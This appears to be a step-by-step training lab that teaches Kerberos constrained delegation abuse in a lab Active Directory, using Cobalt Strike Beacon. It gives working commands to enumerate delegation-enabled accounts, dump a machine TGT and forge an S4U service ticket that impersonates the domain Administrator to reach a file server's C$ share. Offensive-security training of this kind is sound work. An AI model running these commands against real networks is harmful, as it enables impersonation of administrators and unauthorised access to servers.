

# Introduction



The objective of this lab is to abuse constrained delegation to obtain access to a back-end service.

Log into @lab.VirtualMachine(attacker-desktop).SelectLink with the password ```@lab.VirtualMachine(attacker-desktop).Password```.



> [!NOTE]
> @lab.Activity(beacon)

---

## Enumeration

1. [ ] Launch Cobalt Strike and connect to the team server.

1. [ ] Search for computers whose *msDS-AllowedToDelegateTo* attribute is not null.
  
    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
    ```

    > [!HINT] This should return *lon-ws-1$*, which is permitted to delegate to *cifs/lon-fs-1*.

1. [ ] Use PowerShell to check that the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is set.

    ```Terminal-nocolor
    [Convert]::ToBoolean(16781312 -band 16777216)
    ```

    > [!HINT] This should return *True*.

1. [ ] Move laterally to *lon-ws-1*.

	> [!HELP] You should know how to do this from previous labs.

---

## Exploitation

1. [ ] Dump the TGT for *lon-ws-1*.

    ```Beacon-nocolor
    krb_dump /luid:3e7 /service:krbtgt
    ```

1. [ ] Perform the S4U abuse to obtain a usable service ticket for *cifs/lon-fs-1*, impersonating the default domain admin.
  
    ```Beacon-nocolor
    krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
    ```

1. [ ] Use the ticket to access the C$ share on *lon-fs-1*.

	> [!HELP] You should know how to do this from previous labs.



> [!KNOWLEDGE] In this lab, you have learned how to abuse constrained delegation (with protocol transition) to impersonate any user to the delegated service.
